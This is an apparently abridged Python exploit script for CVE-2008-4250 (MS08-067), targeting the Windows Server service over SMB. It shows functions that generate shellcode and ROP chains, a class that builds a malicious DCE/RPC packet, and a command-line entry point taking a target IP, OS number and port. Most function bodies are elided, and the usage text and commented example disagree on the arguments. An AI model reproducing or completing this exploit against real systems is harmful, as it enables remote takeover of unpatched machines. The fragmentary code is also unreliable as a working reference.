#!/usr/bin/env python3
'''NETAPI POC (OR CVE-2008-4250) EXPLOITATION '''
...
def gen_shellcode(filepath):
    ...
    return module_base, nonxjmper, disableNXjumper, ropjumper, shellcode

def generate_rop(rvas, filepath):
    module_base, nonxjmper, disableNXjumper, ropjumper, shellcode = gen_shellcode(filepath)
...
class SRVSVC_Exploit(Thread):
    def __init__(self, filepath, target, os, port=445):
    ...
    def __DCEPacket(self):
        ...
        if self.os == '1':
            ...
            # the nonxjmper also work in this case.
            jumper = generate_rop(rvasets, filepath) + "AB"
        else:
...
if __name__ == '__main__':
    ...
    try:
        ...
        os = sys.argv[2]
        port = sys.argv[3]
        current = SRVSVC_Exploit(filepath, target, os, port)
        current.start()
    except IndexError:
        print(f'\nUsage: {sys.argv[0]} <target ip> <os #> <Port #>\n')
        # print 'Example: MS08_067_2018.py 192.168.1.1 1 445 filepath -- for Windows XP SP0/SP1 Universal, port 445'
